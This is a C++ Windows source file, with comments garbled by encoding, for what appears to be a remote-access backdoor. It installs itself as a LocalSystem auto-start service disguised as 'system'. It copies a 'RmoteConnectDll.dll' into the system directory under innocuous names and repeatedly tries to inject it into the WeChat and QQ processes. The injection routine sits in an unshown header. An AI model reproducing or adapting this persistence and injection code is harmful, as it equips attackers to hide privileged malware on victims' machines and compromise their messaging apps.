#include <stdio.h>
#include <winsock2.h>
#include <stdlib.h>
#include <iostream>
#include <string>

#include "dump.h"
 
#pragma comment(lib, "ws2_32.lib")
using namespace std;
             
void  WINAPI ServiceMain(DWORD,LPTSTR *);
void WINAPI ServiceCtrlHandler(DWORD Opcode);
BOOL  InstallCmdService();
void DelServices();
void  Usage(void);
//VOID WINAPI EXEBackMain (LPVOID s);
SERVICE_STATUS m_ServiceStatus;
SERVICE_STATUS_HANDLE m_ServiceStatusHandle;
BOOL bRunning=true;

#define WSAerron WSAGetLastError()
#define erron GetLastError()

int main(int argc,char *argv[])
{
   	SERVICE_TABLE_ENTRY DispatchTable[] =
	{
		{"system",ServiceMain},//�����������ƺ���ڵ�(����)
		{NULL    ,NULL    }
//SERVICE_TABLE_ENTRY�ṹ�����ԡ�NULL��������
	};
  //  if(argc==1) door();

	if(argc==2) 
	{
		if(!stricmp(argv[1],"-i"))//����ڶ�����������-install
		{
			InstallCmdService();
		}
		else if(!stricmp(argv[1],"-r"))//�Ƚ��ַ���s1��s2
		{
			DelServices();
		}
		else
		{
		Usage();
		}
		return 0;
	}
	StartServiceCtrlDispatcher(DispatchTable);//����ڵ�ĵ�ַ����
	return 0;
}

void WINAPI ServiceMain(DWORD dwArgc,LPTSTR *lpArgv) 
//����������
{
    m_ServiceStatus.dwServiceType = SERVICE_WIN32;
	m_ServiceStatus.dwCurrentState = SERVICE_START_PENDING; 
	m_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE;
	m_ServiceStatus.dwWin32ExitCode = 0; 
	m_ServiceStatus.dwServiceSpecificExitCode = 0; 
	m_ServiceStatus.dwCheckPoint = 0; 
	m_ServiceStatus.dwWaitHint = 0;
	m_ServiceStatusHandle = RegisterServiceCtrlHandler("system",ServiceCtrlHandler);
	if (m_ServiceStatusHandle == (SERVICE_STATUS_HANDLE)0)return; 
	m_ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
//���÷���״̬
	m_ServiceStatus.dwCheckPoint = 0; 
	m_ServiceStatus.dwWaitHint = 0; 
	//SERVICE_STATUS�ṹ�����߸���Ա�����Ƿ�ӳ���������״̬��
	//������Щ��Ա����������ṹ�����ݵ�SetServiceStatus֮ǰ��ȷ������
   if( SetServiceStatus (m_ServiceStatusHandle, &m_ServiceStatus))
 	bRunning=true;

	
   char chSysPath1[1024];
   char chSysPath2[1024];
   ZeroMemory(chSysPath1,1024);	
   ZeroMemory(chSysPath2,1024);	
   if(dwArgc>1)
	{
		while(1)
		{
			if(dll(lpArgv[1],lpArgv[2]))
			{
				break;
			}
		}
	}else
	{
		GetSystemDirectory(chSysPath1,sizeof(chSysPath1));//ȡϵͳĿ¼
		strcat(chSysPath1,"\\SysQnt.dll");
		GetSystemDirectory(chSysPath2,sizeof(chSysPath2));//ȡϵͳĿ¼
		strcat(chSysPath2,"\\SysWnt.dll");
		while(1)
		{
			if(dll(chSysPath2,"WeChat.EXE"))
			{
				break;
			}
			if(dll(chSysPath1,"QQ.EXE"))
			{
				break;
			}
		}
	}

	return; 
}
void WINAPI ServiceCtrlHandler(DWORD Opcode)//������ƺ���
{
	switch(Opcode) 
	{ 
	case SERVICE_CONTROL_PAUSE:    // we accept the command to pause it
		m_ServiceStatus.dwCurrentState = SERVICE_PAUSED; 
		break; 
	case SERVICE_CONTROL_CONTINUE:  
		m_ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
		break; 
	case SERVICE_CONTROL_STOP:   
		m_ServiceStatus.dwWin32ExitCode = 0; 
		m_ServiceStatus.dwCurrentState = SERVICE_STOPPED; 
		m_ServiceStatus.dwCheckPoint = 0; 
		m_ServiceStatus.dwWaitHint = 0; 
		SetServiceStatus (m_ServiceStatusHandle,&m_ServiceStatus);
		bRunning=false;
		break;
	case SERVICE_CONTROL_INTERROGATE: 
		break; 
	} 
	return; 
}
BOOL InstallCmdService()//��װ������
{
	char strDir[1024];
	char chSysPath[1024];
	SC_HANDLE schSCManager,schService;

	ZeroMemory(strDir,1024);
	ZeroMemory(chSysPath,1024);
	GetCurrentDirectory(1024,strDir);//ȡ��ǰĿ¼
	strcat(strDir,"\\RmoteConnectDll.dll");
	GetSystemDirectory(chSysPath,sizeof(chSysPath));//ȡϵͳĿ¼
	strcat(chSysPath,"\\SysQnt.dll");
	if(CopyFile(strDir,chSysPath,FALSE))printf("Copy SysQnt.dll OK\n"); 

	ZeroMemory(strDir,1024);
	ZeroMemory(chSysPath,1024);
	GetCurrentDirectory(1024,strDir);//ȡ��ǰĿ¼
	strcat(strDir,"\\RmoteConnectDll.dll");
	GetSystemDirectory(chSysPath,sizeof(chSysPath));//ȡϵͳĿ¼
	strcat(chSysPath,"\\SysWnt.dll");
	if(CopyFile(strDir,chSysPath,FALSE))printf("Copy SysWnt.dll OK\n"); 

	ZeroMemory(strDir,1024);
	ZeroMemory(chSysPath,1024);
	GetCurrentDirectory(1024,strDir);//ȡ��ǰĿ¼
	GetModuleFileName(NULL,strDir,sizeof(strDir));
//ȡ��ǰ�ļ�·�����ļ���
	GetSystemDirectory(chSysPath,sizeof(chSysPath));//ȡϵͳĿ¼
	strcat(chSysPath,"\\system.exe");
//��system.exeƴ�ӵ�ϵͳĿ¼
	if(CopyFile(strDir,chSysPath,FALSE))printf("Copy system.exe OK\n"); 
// �ѵ�ǰ��������Ƶ�ϵͳ��Ŀ¼Ϊsystem.exe
	strcpy(strDir,chSysPath);
	schSCManager = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS); 
	if (schSCManager == NULL) 
	{
		printf("open scmanger failed,maybe you do not have the privilage to do this\n");
		return false;
	}
	LPCTSTR lpszBinaryPathName=strDir;
	schService = CreateService(schSCManager,
		"system",
		"system", //���������Ϣ��ӵ�SCM�����ݿ�
		SERVICE_ALL_ACCESS, // desired access 
		SERVICE_WIN32_OWN_PROCESS, // service type 
		SERVICE_AUTO_START, // start type 
		SERVICE_ERROR_NORMAL, // error control type 
		lpszBinaryPathName, // service's binary 
		NULL, // no load ordering group 
		NULL, // no tag identifier 
		NULL, // no dependencies 
		NULL, // LocalSystem account 
		NULL); // no password 
        if (schService) printf("Install Service Success!\n");
		else
		return false; 
		CloseServiceHandle(schService); 
	return true;
}
void DelServices()
{
    char name[100];
    SC_HANDLE scm;
    SC_HANDLE service;
    SERVICE_STATUS status;
	strcpy(name,"system");
    if((scm=OpenSCManager(NULL,NULL,SC_MANAGER_CREATE_SERVICE))==NULL)
    {
        printf("OpenSCManager Error ");
    }
    service=OpenService(scm,name,SERVICE_ALL_ACCESS|DELETE);
    if (!service)
    {
        printf("OpenService error! ");
        return;
    }
    BOOL isSuccess=QueryServiceStatus(service,&status);
    if (!isSuccess)
    {
        printf("QueryServiceStatus error! ");
        return;
    }
    if ( status.dwCurrentState!=SERVICE_STOPPED )
    {
        isSuccess=ControlService(service,SERVICE_CONTROL_STOP,&status);
        if (!isSuccess )
            printf("Stop Service error! ");
        Sleep( 500 );
    }
    isSuccess=DeleteService(service);
    if (!isSuccess)
         printf("Delete Service Fail!");
    else
         printf("Delete Service Success! ");
    CloseServiceHandle(service );
    CloseServiceHandle(scm);
}

void Usage()
{
fprintf(stderr,"Code by dahubaobao\n"
               "Usage:%s ��[-i] [-r]�� ��connect ip����port��-i: install service; -r: remove service.\n");
       }
